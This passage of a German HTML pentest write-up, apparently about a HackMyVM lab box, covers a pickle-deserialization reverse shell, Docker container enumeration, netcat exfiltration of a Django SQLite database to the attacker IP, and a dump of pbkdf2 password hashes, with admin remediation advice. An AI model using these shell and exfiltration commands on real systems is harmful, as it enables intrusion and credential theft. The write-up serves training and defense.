            <br>Nach dem Senden des POST-Requests an <span class="command">/search</span> auf der Ziel-VM zeigt die Ausgabe des Netcat-Listeners eine eingehende Verbindung von der IP-Adresse des Ziels (192.168.2.48) auf dem Port 32918. Dies bestÃ¤tigt, dass der Pickle Payload erfolgreich ausgefÃ¼hrt wurde und die Reverse Shell initiiert hat. Die folgenden Zeilen <span class="command">bash: cannot set terminal process group (1): Inappropriate ioctl for device</span> und <span class="command">bash: no job control in this shell</span> sind typische Meldungen fÃ¼r eine nicht vollstÃ¤ndig interaktive Shell, die aber fÃ¼r die AusfÃ¼hrung von Befehlen ausreicht. Der <span class="command">id</span> Befehl wurde sofort ausgefÃ¼hrt, um die aktuellen Benutzerberechtigungen zu prÃ¼fen.
        </p>
        <p class="evaluation">
            <strong>Bewertung:</strong> Fantastisch! Der initiale Zugriff war erfolgreich, nun habe ich mein Ziel erreicht! Die eingehende Verbindung und die Ausgabe des <span class="command">id</span>-Befehls, der <span class="password">uid=0(root) gid=0(root) groups=0(root)</span> zeigt, bestÃ¤tigen, dass die Reverse Shell mit Root-Berechtigungen ausgefÃ¼hrt wurde. Das ist ein kritischer Erfolg, der die Schwere der Pickle Deserialisierungs-Schwachstelle unterstreicht. Ich habe direkten Systemzugriff, wenn auch zunÃ¤chst in einer eingeschrÃ¤nkten Shell. Die anschlieÃŸenden <span class="command">ls</span>-Befehle zeigen die Dateistruktur im aktuellen Verzeichnis (<span class="command">/home</span>) und offenbaren Dateien wie <span class="command">requirements.sh</span>, <span class="command">run.sh</span> und das Verzeichnis <span class="command">site</span>.
        </p>
        <p class="recommendation">
            <strong>Empfehlung (Pentester):</strong> Sichern Sie die Shell, um sie stabiler zu machen und volle Terminalfunktionen zu erhalten (z.B. mit <span class="command">script /dev/null -c bash</span> oder Python PTY-Shell). Beginnen Sie sofort mit der System-Enumeration, um zu verstehen, auf welchem System Sie sich befinden (Host oder Container?), welche Tools verfÃ¼gbar sind und welche Privilegien Sie tatsÃ¤chlich haben, um das endgÃ¼ltige Root auf dem Host-System zu erlangen.
            <br><strong>Empfehlung (Admin):</strong> **Alarmstufe Rot:** Ein Angreifer hat Root-Zugriff Ã¼ber die Webanwendung erlangt. Die Schwachstelle muss sofort behoben werden (unsichere Deserialisierung). Isolieren Sie das kompromittierte System vom Netzwerk, um eine weitere Ausbreitung zu verhindern. FÃ¼hren Sie eine umfassende Forensik durch, um das AusmaÃŸ des Kompromittierung festzustellen. ÃœberprÃ¼fen Sie alle Webanwendungen auf Ã¤hnliche unsichere Deserialisierungs- oder Remote Code Execution Schwachstellen.
        </p>
        <div class="code-block">
            <div class="terminal">
                <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">nc -lvnp 4444</span></div>
            </div>
            <div class="terminal">
                <pre>
listening on [any] 4444 ...
<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.48] 32918</span>
<span class="password">bash: cannot set terminal process group (1): Inappropriate ioctl for device</span>
<span class="password">bash: no job control in this shell</span>
root@8b39a559b296:/home# <span class="command">id</span>
<span class="password">uid=0(root) gid=0(root) groups=0(root)</span>
root@8b39a559b296:/home# <span class="command">ls</span>
<span class="command">requirements.sh</span>
<span class="command">run.sh</span>
<span class="command">site</span>
root@8b39a559b296:/home# 
</pre>
            </div>
        </div>

        <section id="proof-of-concept">
             <h2>Proof of Concept: Remote Code Execution via Unsafe Pickle Deserialization</h2>
             <p>
                <strong>Kurzbeschreibung:</strong> Dieser Proof of Concept demonstriert, wie die identifizierte unsichere Deserialisierungs-Schwachstelle im <span class="command">search_cookie</span> der Webanwendung ausgenutzt werden kann, um beliebigen Code mit Root-Berechtigungen auf dem Zielsystem auszufÃ¼hren. Dies fÃ¼hrte zur Erlangung einer Reverse Shell und damit zum initialen Zugriff auf das System.
             </p>
             <p>
                <strong>Voraussetzungen:</strong>
                <ul>
                    <li>Zugriff auf das Netzwerk, in dem sich die Ziel-VM (192.168.2.48) befindet.</li>
                    <li>Ein Angreifer-System (z.B. Kali Linux) mit installierten Tools (<span class="command">python3</span>, <span class="command">base64</span>, <span class="command">pickletools</span>, <span class="command">os</span>, <span class="command">nc</span>, <span class="command">curl</span> oder Web-Proxy wie Burp Suite).</li>
                    <li>Kenntnisse Ã¼ber Python Pickle Deserialisierungsschwachstellen.</li>
                    <li>Die IP-Adresse des Angreifer-Systems (192.168.2.199) und ein offener Port fÃ¼r den Netcat-Listener (4444).</li>
                </ul>
             </p>
             <p>
                <strong>Schritt-fÃ¼r-Schritt-Anleitung:</strong>
                <ol>
                    <li>**Identifizierung der Schwachstelle:** Durch Analyse des HTTP-Verkehrs und der Antwort des <span class="command">/search</span>-Pfads wird das <span class="command">search_cookie</span> identifiziert, dessen Wert eine BASE64-kodierte Python Pickle-Struktur zu sein scheint. (Siehe Schritte in der Web Enumeration).</li>
                    <li>**Analyse des Pickle-Objekts:** Dekodieren und Disassemblieren des Cookie-Werts bestÃ¤tigt die Verwendung von Pickle.</li>
                    <li>**Erstellung des bÃ¶sartigen Payloads:** Ein Python-Skript wird erstellt, das ein Objekt mit einer <span class="command">__reduce__</span>-Methode definiert. Diese Methode enthÃ¤lt einen Reverse Shell-Bash-Befehl, der eine Verbindung zum Angreifer-System herstellen soll. Das Objekt wird serialisiert und in BASE64 kodiert.</li>
                    <li>**Vorbereitung des Listeners:** Auf dem Angreifer-System wird ein Netcat-Listener auf dem im Payload definierten Port (z.B. 4444) gestartet: <span class="command">nc -lvnp 4444</span>.</li>
                    <li>**AusfÃ¼hrung des Exploits:** Ein HTTP POST-Request an den <span class="command">/search</span>-Pfad wird gesendet. Im <span class="command">Cookie</span>-Header wird der Wert des <span class="command">search_cookie</span> durch den generierten, bÃ¶sartigen BASE64-Payload ersetzt.</li>
                </ol>
             </p>
             <p>
                <strong>Erwartetes Ergebnis:</strong> Eine eingehende TCP-Verbindung von der Ziel-VM auf dem Netcat-Listener des Angreifer-Systems. Nach der Verbindung sollte eine interaktive Shell mit den Berechtigungen des Webserver-Prozesses (in diesem Fall Root) verfÃ¼gbar sein.
             </p>
             <p>
                <strong>Beweismittel:</strong>
                <!-- Hier wÃ¼rden Screenshots oder Log-Ausschnitte stehen -->
                <div class="code-block">
                    <div class="terminal">
                        <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">nc -lvnp 4444</span></div>
                    </div>
                    <div class="terminal">
                        <pre>
listening on [any] 4444 ...
<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.48] 32918</span>
<span class="password">bash: cannot set terminal process group (1): Inappropriate ioctl for device</span>
<span class="password">bash: no job control in this shell</span>
root@8b39a559b296:/home# <span class="command">id</span>
<span class="password">uid=0(root) gid=0(root) groups=0(root)</span>
root@8b39a559b296:/home#
</pre>
                    </div>
                </div>
             </p>
             <p>
                <strong>Risikobewertung:</strong> Die Ausnutzung dieser Schwachstelle ermÃ¶glicht einem unauthentifizierten Angreifer die vollstÃ¤ndige Kontrolle Ã¼ber das kompromittierte System mit Root-Berechtigungen (im Kontext des Docker-Containers, was aber immer noch kritisch ist). Dies kann zu Datenverlust, unbefugtem Zugriff auf sensible Informationen, Installation von Malware oder einer BrÃ¼cke fÃ¼r weitere Angriffe im Netzwerk fÃ¼hren.
             </p>
             <p class="recommendation">
                <strong>Empfehlung (Admin):</strong> **Dringende Behebung erforderlich.** Stellen Sie die Verwendung von Python Pickle fÃ¼r die Serialisierung von Daten, die von Benutzern oder Clients stammen, sofort ein. Verwenden Sie sichere Serialisierungsformate. Implementieren Sie strenge Input-Validierung. Ãœberwachen Sie den Netzwerkverkehr auf ungewÃ¶hnliche Muster. FÃ¼hren Sie eine grÃ¼ndliche SicherheitsÃ¼berprÃ¼fung der gesamten Webanwendung durch.
             </p>
        </section>


        <section id="privilege-escalation">
            <h2>Privilege Escalation</h2>
            <p class="analysis">
                <strong>Analyse:</strong> Nach der erfolgreichen Erlangung einer Root-Shell auf dem System ist es entscheidend, die Umgebung genau zu analysieren. Die Shell-Prompt <span class="command">root@8b39a559b296:/home#</span> mit einer kurzen, zufÃ¤llig aussehenden Hostnamen (<span class="command">8b39a559b296</span>) und die Art der nicht-interaktiven Shell deuten stark darauf hin, dass ich mich nicht direkt auf dem Host-Betriebssystem befinde, sondern in einem Docker-Container. Dies wird durch den Befehl <span class="command">cat /proc/1/cgroup</span> Ã¼berprÃ¼ft, der Informationen Ã¼ber die Control Groups (cgroup) des Prozesses mit PID 1 (dem ersten Prozess im Container, typischerweise Init) ausgibt.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Die Ausgabe von <span class="command">/proc/1/cgroup</span>, die Pfade wie <span class="command">/docker/8b39a559b296...</span> enthÃ¤lt, bestÃ¤tigt zweifelsfrei, dass ich Root-Berechtigungen *innerhalb eines Docker-Containers* habe. Das bedeutet, meine Root-Rechte sind auf die isolierte Umgebung des Containers beschrÃ¤nkt. Die eigentlichen Flags (user.txt, root.txt) befinden sich wahrscheinlich auf dem zugrundeliegenden Host-System. Daher ist das Ziel nun die Privilegien-Eskalation *aus dem Container heraus* auf das Host-System.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Beginnen Sie mit der Enumeration innerhalb des Containers, um nach Konfigurationsfehlern, empfindlichen Dateien oder Mounts zu suchen, die einen Weg auf das Host-System ermÃ¶glichen kÃ¶nnten. Typische Angriffspunkte sind falsch konfigurierte Docker-Sockets, sensitive Dateien, die vom Host gemountet sind, oder Capabilities des Containers, die eine Interaktion mit dem Host erlauben.
                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Docker-Container mit den geringstmÃ¶glichen Privilegien laufen (Least Privilege Principle). Vermeiden Sie es, Container als Root zu starten. BeschrÃ¤nken Sie die Capabilities der Container. Mounten Sie keine sensiblen Host-Verzeichnisse oder den Docker-Socket in den Container, es sei denn, dies ist absolut notwendig und sicher konfiguriert. Ãœberwachen Sie Container auf ungewÃ¶hnliche AktivitÃ¤ten oder Verbindungsversuche nach auÃŸen oder zum Host.
            </p>
             <div class="code-block">
                 <div class="terminal">
                     <pre>
root@8b39a559b296:~# <span class="command">cd /home/</span>
root@8b39a559b296:/home# <span class="command">cat run.sh</span> 
<span class="command">python3 site/manage.py runserver 0.0.0.0:5003</span>

root@8b39a559b296:/home# <span class="command">cat /proc/1/cgroup</span>
<span class="password">11:pids:/docker/8b39a559b296ca6a5dd86d4dcc8796db615ff05f518ba01884a717527259e3bc</span>
<span class="password">10:blkio:/docker/8b39a559b296ca6a5dd86d4dcc8796db615ff05f518ba01884a717527259e3bc</span>
<span class="password">9:freezer:/docker/8b39a559b296ca6a5dd86d4dcc8796db615ff05f518ba01884a717527259e3bc</span>
<span class="password">8:perf_event:/docker/8b39a559b296ca6a5dd86d4dcc8796db615ff05f518ba01884a717527259e3bc</span>
<span class="password">7:memory:/docker/8b39a559b296ca6a5dd86d4dcc8796db615ff05f518ba01884a717527259e3bc</span>
<span class="password">6:hugetlb:/docker/8b39a559b296ca6a5dd86d4dcc8796db615ff05f518ba01884a717527259e3bc</span>
<span class="password">5:cpu,cpuacct:/docker/8b39a559b296ca6a5dd86d4dcc8796db615ff05f518ba01884a717527259e3bc</span>
<span class="password">4:cpuset:/docker/8b39a559b296ca6a5dd86d4dcc8796db615ff05f518ba01884a717527259e3bc</span>
<span class="password">3:net_cls,net_prio:/docker/8b39a559b296ca6a5dd86d4dcc8796db615ff05f518ba01884a717527259e3bc</span>
<span class="password">2:devices:/docker/8b39a559b296ca6a5dd86d4dcc8796db615ff05f518ba01884a717527259e3bc</span>
<span class="password">1:name=systemd:/docker/8b39a559b296ca6a5dd86d4dcc8796db615ff05f518ba01884a717527259e3bc</span>
</pre>
                 </div>
            </div>

            <p class="analysis">
                <strong>Analyse:</strong> Ein wichtiger Aspekt der Container-Sicherheit sind Linux Capabilities. StandardmÃ¤ÃŸig haben Root-Benutzer im Container viele, aber nicht alle Capabilities des Host-Roots. Der Befehl <span class="command">capsh --print</span> zeigt die aktuellen Capabilities des Prozesses an. Die Ausgabe listet die <span class="command">Current</span> und <span class="command">Bounding set</span> von Capabilities auf, wie z.B. <span class="command">cap_chown</span>, <span class="command">cap_net_raw</span>, <span class="command">cap_setuid</span> etc.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Die aufgelisteten Capabilities sind die, mit denen der Root-Prozess im Container arbeiten kann. Die meisten davon sind Standard-Capabilities fÃ¼r Root innerhalb eines Containers. Es gibt keine offensichtlichen ungewÃ¶hnlichen oder Ã¼bermÃ¤ÃŸig gefÃ¤hrlichen Capabilities (wie <span class="command">cap_sys_admin</span> oder das Mounten von Dateisystemen), die einen direkten Ausbruch ermÃ¶glichen wÃ¼rden. Dies deutet darauf hin, dass ein Ausbruch Ã¼ber ungewÃ¶hnliche Container-Capabilities unwahrscheinlich ist. Der Fokus sollte auf anderen Schwachstellen liegen, wie falsch gemounteten Verzeichnissen, schwachen Host-Diensten, oder Konfigurationen, die einen Zugriff auf das Host-System erlauben.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Da Capabilities keinen offensichtlichen Ausbruch erlauben, konzentrieren Sie sich auf andere Enumerationsschritte innerhalb des Containers: Suchen Sie nach sensiblen Dateien (Konfigurationsdateien, PasswÃ¶rter), identifizieren Sie gemountete Verzeichnisse (<span class="command">mount</span> Befehl), scannen Sie das interne Container-Netzwerk, um andere Dienste oder Container zu finden, und suchen Sie nach Anzeichen fÃ¼r den Docker-Socket oder andere Verwaltungsschnittstellen.
                <br><strong>Empfehlung (Admin):</strong> ÃœberprÃ¼fen Sie die Capability-Konfiguration Ihrer Docker-Container. FÃ¼hren Sie Container mit einem minimalen Set von Capabilities aus, die nur fÃ¼r die spezifische Funktion des Containers notwendig sind. Vermeiden Sie die Option <span class="command">--privileged</span>, die alle Host-Capabilities dem Container gibt.
            </p>
             <div class="code-block">
                 <div class="terminal">
                     <pre>
root@8b39a559b296:~# <span class="command">capsh --print</span>
<span class="command">Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip</span>
<span class="command">Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap</span>
<span class="command">Securebits: 00/0x0/1'b0</span>
 <span class="command">secure-noroot: no (unlocked)</span>
 <span class="command">secure-no-suid-fixup: no (unlocked)</span>
 <span class="command">secure-keep-caps: no (unlocked)</span>
<span class="command">uid=0(root)</span>
<span class="command">gid=0(root)</span>
<span class="command">groups=</span>
</pre>
                 </div>
            </div>

            <p class="analysis">
                <strong>Analyse:</strong> Da ich mich in einem Docker-Container befinde, Ã¼berprÃ¼fe ich die Netzwerkkonfiguration innerhalb des Containers, um zu sehen, ob andere interne Netzwerke oder Hosts erreichbar sind. Der Befehl <span class="command">ip a</span> zeigt die Netzwerkschnittstellen und IP-Adressen des Containers. Die Ausgabe zeigt die Loopback-Schnittstelle (<span class="command">lo</span>) und eine Ethernet-Schnittstelle (<span class="command">eth0@if5</span>) mit der IP-Adresse <span class="command">172.17.0.2/16</span>. Dies ist ein typisches Docker-Bridge-Netzwerk. Der Host, der diesen Container ausfÃ¼hrt, hat normalerweise die IP-Adresse <span class="command">172.17.0.1</span> in diesem Subnetz.
                <br>Um zu prÃ¼fen, welche Ports auf dem Host (oder anderen Systemen im internen Docker-Netzwerk) von meinem Container aus erreichbar sind, fÃ¼hre ich einen Netcat-Scan auf der IP-Adresse <span class="command">172.17.0.1</span> Ã¼ber alle Ports (<span class="command">1-65535</span>) durch. Der Befehl <span class="command">nc -znv 172.17.0.1 1-65535</span> nutzt Netcat im Zero-I/O-Modus (<span class="command">-z</span>) zum Scannen, ohne Daten zu senden oder zu empfangen.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Der interne Netzwerkscan ist erfolgreich und zeigt, dass von meinem Container aus die Ports <span class="command">5003/tcp (http)</span> und <span class="command">22/tcp (ssh)</span> auf der IP-Adresse <span class="command">172.17.0.1</span> offen sind. Die IP <span class="command">172.17.0.1</span> ist sehr wahrscheinlich die Bridge-IP des Docker-Hosts. Die Tatsache, dass diese Ports offen sind und vom Container aus erreichbar sind, ist von hÃ¶chstem Interesse. Port 5003 ist der Webserver, Ã¼ber den ich initialen Zugriff erlangt habe, jetzt aber vom internen Netzwerk aus erreichbar. Port 22 (SSH) auf dem Host-System ist ein potenzieller Weg zur Privilegien-Eskalation, wenn Anmeldedaten gefunden werden kÃ¶nnen.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Konzentrieren Sie die Enumeration nun auf die Dienste, die auf <span class="command">172.17.0.1</span> laufen. Versuchen Sie, sich Ã¼ber SSH mit den identifizierten Benutzernamen (<span class="command">ramsey</span>, <span class="command">wan</span>, <span class="command">oliver</span>) und den spÃ¤ter mÃ¶glicherweise gefundenen PasswÃ¶rtern anzumelden. Untersuchen Sie auch den Webserver (Port 5003) von dieser internen Position aus, da es dort mÃ¶glicherweise andere Schwachstellen oder ZugÃ¤nge gibt als von auÃŸen.
                <br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie Docker-Netzwerke standardmÃ¤ÃŸig so, dass Container nicht auf alle Ports des Hosts zugreifen kÃ¶nnen, es sei denn, dies ist explizit fÃ¼r die Anwendung notwendig. BeschrÃ¤nken Sie den Netzwerkzugriff zwischen Containern und dem Host, um die AngriffsflÃ¤che im Falle einer Container-Kompromittierung zu minimieren. Stellen Sie sicher, dass interne Dienste auf dem Host, die nur fÃ¼r administrative Zwecke gedacht sind, nicht Ã¼ber die Docker-Bridge erreichbar sind.
            </p>
            <div class="code-block">
                 <div class="terminal">
                     <pre>
root@8b39a559b296:/home/site# <span class="command">ip a</span>
<span class="command">1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1</span>
    <span class="command">link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span>
    <span class="command">inet 127.0.0.1/8 scope host lo</span>
       <span class="command">valid_lft forever preferred_lft forever</span>
<span class="command">4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default </span>
    <span class="command">link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span>
    <span class="command">inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0</span>
       <span class="command">valid_lft forever preferred_lft forever</span>
root@8b39a559b296:/home/site# <span class="command">nc -znv 172.17.0.1 1-65535</span>
<span class="password">(UNKNOWN) [172.17.0.1] 5003 (?) open</span>
<span class="password">(UNKNOWN) [172.17.0.1] 22 (ssh) open</span>
</pre>
                 </div>
            </div>

            <p class="analysis">
                <strong>Analyse:</strong> WÃ¤hrend der Enumeration innerhalb des Containers fiel mir das Verzeichnis <span class="command">site</span> im <span class="command">/home</span>-Verzeichnis auf. Da die Webanwendung eine Django-Anwendung ist, vermute ich, dass sich die Anwendungsdateien, einschlieÃŸlich der Django-Einstellungen und mÃ¶glicherweise einer lokalen Datenbank, in diesem Verzeichnis befinden. Ich beschlieÃŸe, die SQLite-Datenbank-Datei aus dem Container auf mein Angreifer-System zu exfiltrieren.
                <br>Ich verwende Netcat (<span class="command">nc</span>) fÃ¼r die Exfiltration. Auf meinem Angreifer-System starte ich einen Listener auf Port 7777, der alle eingehenden Daten in eine Datei namens <span class="command">db.sqlite3</span> umleitet (<span class="command">nc -lvp 7777 > db.sqlite3</span>).
                <br>Auf der Container-Shell navigiere ich zum <span class="command">site</span>-Verzeichnis (<span class="command">cd /home/site</span>) und sende den Inhalt der Datei <span class="command">db.sqlite3</span> Ã¼ber eine Netcat-Verbindung an meinen Listener (<span class="command">nc -q 0 192.168.2.199 7777 < db.sqlite3</span>).
                <br>- <span class="command">-q 0</span>: Sorgt dafÃ¼r, dass Netcat die Verbindung sofort nach dem Senden der Datei schlieÃŸt.
                <br>- <span class="command">< db.sqlite3</span>: Leitet den Inhalt der Datei als Standardeingabe an Netcat um.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Die Exfiltration der Datenbankdatei ist erfolgreich. Eine SQLite-Datenbank kann sehr sensible Informationen enthalten, wie Benutzerkonten, gehashte PasswÃ¶rter, Konfigurationseinstellungen oder Anwendungsdaten. Die DateigrÃ¶ÃŸe von 151552 Bytes fÃ¼r <span class="command">db.sqlite3</span> deutet darauf hin, dass sie Daten enthÃ¤lt. Das Ziel ist nun, den Inhalt dieser Datenbank zu analysieren, insbesondere die Benutzerkonten-Tabelle, um Hashes oder Anmeldedaten zu finden, die fÃ¼r die Privilegien-Eskalation auf dem Host-System nÃ¼tzlich sein kÃ¶nnten (z.B. SSH-Zugang). Die <span class="command">run.sh</span> Datei wurde ebenfalls gesichert, um zu sehen, wie die Anwendung gestartet wird.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Ã–ffnen Sie die exfiltrierte <span class="command">db.sqlite3</span>-Datei mit einem SQLite-Client, untersuchen Sie die Tabellen und extrahieren Sie alle relevanten Daten, insbesondere Benutzernamen und gehashte PasswÃ¶rter. Versuchen Sie, die Hashes zu knacken. Analysieren Sie auch die <span class="command">run.sh</span>-Datei auf weitere Konfigurationsdetails oder Hinweise.
                <br><strong>Empfehlung (Admin):</strong> Speichern Sie sensible Daten wie Datenbankdateien nicht an Ã¶ffentlich zugÃ¤nglichen Orten innerhalb des Containers oder an Orten, die leicht exfiltriert werden kÃ¶nnen. ErwÃ¤gen Sie die VerschlÃ¼sselung von Datenbanken. Implementieren Sie Mechanismen, um das unbefugte Auslesen von Dateien zu erkennen und zu verhindern. Ãœberwachen Sie den Netzwerkverkehr aus Containern auf ungewÃ¶hnliche Verbindungen zu externen Systemen, die auf Datenexfiltration hindeuten kÃ¶nnten.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">nc -lvp 7777 > db.sqlite3</span></div>
                </div>
                <div class="terminal">
                    <pre>
listening on [any] 7777 ...
connect to [192.168.2.199] from unbakedpie.hmv [192.168.2.48] 46908
<span class="command">id</span>
</pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <pre>
root@8b39a559b296:/home# <span class="command">nc 192.168.2.199 7777 < run.sh</span>
<span class="command">id</span>

root@8b39a559b296:/home/site# <span class="command">nc -q 0 192.168.2.199 7777 < db.sqlite3</span> 
</pre>
                </div>
            </div>
             <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">nc -lvp 7777 > db.sqlite3</span></div>
                </div>
                <div class="terminal">
                    <pre>
listening on [any] 7777 ...
connect to [192.168.2.199] from unbakedpie.hmv [192.168.2.48] 46910
</pre>
                </div>
            </div>
             <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">ls -la run.sh db.sqlite3</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="command">-rw-r--r-- 1 root root 151552 16. Jun 15:58 db.sqlite3</span>
<span class="command">-rw-r--r-- 1 root root     46 16. Jun 15:54 run.sh</span>
</pre>
                </div>
            </div>

            <p class="analysis">
                <strong>Analyse:</strong> Ich habe die exfiltrierte <span class="command">db.sqlite3</span> Datei auf meinem Angreifer-System und verwende nun den Befehl <span class="command">sqlite3 db.sqlite3</span>, um die Datenbank zu Ã¶ffnen und ihren Inhalt zu untersuchen. Innerhalb des SQLite-Prompts verwende ich den Befehl <span class="command">.tables</span>, um alle verfÃ¼gbaren Tabellen aufzulisten. Die Ausgabe zeigt verschiedene Tabellen, darunter <span class="command">auth_group</span>, <span class="command">auth_permission</span>, <span class="command">auth_user</span>, <span class="command">django_admin_log</span>, etc. Die Tabelle <span class="command">auth_user</span> ist offensichtlich diejenige, die die Benutzerkonten speichert.
                <br>Ich fÃ¼hre dann eine SQL-Abfrage aus: <span class="command">SELECT * FROM auth_user;</span>, um alle Spalten und Zeilen aus dieser Tabelle anzuzeigen. Diese Abfrage liefert die Benutzer-IDs, Benutzernamen (<span class="command">aniqfakhrul</span>, <span class="command">testing</span>, <span class="command">ramsey</span>, <span class="command">oliver</span>, <span class="command">wan</span>), sowie gehashte PasswÃ¶rter und andere Details.
                <br>Ich fÃ¼hre eine weitere, gezieltere Abfrage aus: <span class="command">SELECT username, password FROM auth_user;</span>, um speziell die Benutzernamen und die zugehÃ¶rigen gehashten PasswÃ¶rter zu extrahieren. Die Hashes haben das Format <span class="command">pbkdf2_sha256$XXXXXX$...</span>, was auf Django's Standard-Passwort-Hashing-Format hinweist.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Die Untersuchung der Datenbank war sehr erfolgreich. Ich habe eine Liste von Benutzernamen gefunden, die die Namen <span class="command">ramsey</span>, <span class="command">oliver</span> und <span class="command">wan</span> enthÃ¤lt, die ich zuvor auf der Homepage gesehen hatte, sowie zusÃ¤tzliche Namen (<span class="command">aniqfakhrul</span>, <span class="command">testing</span>). Entscheidend ist, dass ich die gehashten PasswÃ¶rter fÃ¼r diese Benutzer gefunden habe. PBKDF2 mit SHA256 ist ein relativ starkes Hashing-Verfahren, das Brute-Force erschwert, aber es ist nicht unmÃ¶glich, insbesondere wenn die PasswÃ¶rter schwach sind. Die Anzahl der Iterationen (216000) wird ebenfalls angezeigt, was fÃ¼r das Knacken wichtig ist. Die Anwesenheit dieser Hashes ist ein kritischer Fund fÃ¼r die Privilegien-Eskalation. Die Anmerkung "cracking erstmal kein erfolg..." deutet darauf hin, dass erste Versuche, diese Hashes zu knacken, fehlschlugen, was bei starken Hashes und potenziell komplexen PasswÃ¶rtern nicht ungewÃ¶hnlich ist.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Speichern Sie die gefundenen Benutzernamen und Hashes in einer Datei. Verwenden Sie ein Passwort-Cracking-Tool wie Hashcat oder John the Ripper, um die Hashes offline zu knacken. Konzentrieren Sie sich dabei auf Wortlisten, die fÃ¼r Webanwendungen oder allgemeine PasswÃ¶rter relevant sind. Wenn Hashes geknackt werden, versuchen Sie, diese PasswÃ¶rter fÃ¼r den SSH-Zugang auf dem Host-System (<span class="command">172.17.0.1</span> oder <span class="command">192.168.2.48</span>, falls Port 22 von auÃŸen zugÃ¤nglich ist) und fÃ¼r den Django-Admin-Login zu verwenden.
                <br><strong>Empfehlung (Admin):</strong> Speichern Sie niemals PasswÃ¶rter im Klartext oder mit schwachen Hashing-Algorithmen. PBKDF2 ist gut, aber stellen Sie sicher, dass die Iterationszahl angemessen ist und regelmÃ¤ÃŸig erhÃ¶ht wird. Fordern Sie Benutzer auf, starke, eindeutige PasswÃ¶rter zu verwenden. Implementieren Sie Zwei-Faktor-Authentifizierung fÃ¼r alle kritischen Konten, insbesondere fÃ¼r Administratoren. FÃ¼hren Sie regelmÃ¤ÃŸige Audits Ihrer Datenbanken auf sensible Daten durch.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">sqlite3 db.sqlite3</span></div>
                </div>
                <div class="terminal">
                    <pre>
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> <span class="command">.tables</span>
<span class="command">auth_group                  django_admin_log          </span>
<span class="command">auth_group_permissions      django_content_type       </span>
<span class="command">auth_permission             django_migrations         </span>
<span class="command">auth_user                   django_session            </span>
<span class="command">auth_user_groups            homepage_article          </span>
<span class="command">auth_user_user_permissions</span>
sqlite> 
sqlite> <span class="command">SELECT * FROM auth_user;</span>
<span class="command">1|pbkdf2_sha256$216000$3fIfQIweKGJy$xFHY3JKtPDdn/AktNbAwFKMQnBlrXnJyU04GElJKxEo=|2020-10-03 10:43:47.229292|1|<span class="password">aniqfakhrul</span>|||1|1|2020-10-02 04:50:52.424582|</span>
<span class="command">11|pbkdf2_sha256$216000$0qA6zNH62sfo$8ozYcSpOaUpbjPJz82yZRD26ZHgaZT8nKWX+CU0OfRg=|2020-10-02 10:16:45.805533|0|<span class="password">testing</span>|||0|1|2020-10-02 10:16:45.686339|</span>
<span class="command">12|pbkdf2_sha256$216000$hyUSJhGMRWCz$vZzXiysi8upGO/DlQy+w6mRHf4scq8FMnc1pWufS+Ik=|2020-10-03 10:44:10.758867|0|<span class="password">ramsey</span>|||0|1|2020-10-02 14:42:44.388799|</span>
<span class="command">13|pbkdf2_sha256$216000$Em73rE2NCRmU$QtK5Tp9+KKoP00/QV4qhF3TWIi8Ca2q5gFCUdjqw8iE=|2020-10-02 14:42:59.192571|0|<span class="password">oliver</span>|||0|1|2020-10-02 14:42:59.113998|</span>
<span class="command">14|pbkdf2_sha256$216000$oFgeDrdOtvBf$ssR/aID947L0jGSXRrPXTGcYX7UkEBqWBzC+Q2Uq+GY=|2020-10-02 14:43:15.187554|0|<span class="password">wan</span>|||0|1|2020-10-02 14:43:15.102863|</span>


sqlite> <span class="command">SELECT username, password FROM auth_user;</span>
<span class="command"><span class="password">aniqfakhrul</span>|<span class="password">pbkdf2_sha256$216000$3fIfQIweKGJy$xFHY3JKtPDdn/AktNbAwFKMQnBlrXnJyU04GElJKxEo=</span></span>
<span class="command"><span class="password">testing</span>    |<span class="password">pbkdf2_sha256$216000$0qA6zNH62sfo$8ozYcSpOaUpbjPJz82yZRD26ZHgaZT8nKWX+CU0OfRg=</span></span>
